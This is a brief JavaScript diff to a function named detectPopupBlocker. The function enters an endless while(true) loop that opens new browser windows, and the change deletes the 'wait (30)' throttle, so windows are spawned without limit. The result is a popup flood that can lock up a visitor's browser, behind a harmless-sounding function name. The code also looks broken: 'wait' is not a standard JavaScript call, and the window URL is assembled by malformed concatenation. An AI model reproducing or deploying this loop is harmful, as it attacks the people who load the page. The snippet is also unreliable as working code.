@@ -17,7 +17,6 @@ function detectPopupBlocker() {
   } else {
     myTest.close();
     while (true) {
-      wait (30)
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
       var URL = "jrmiller0.github.io" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
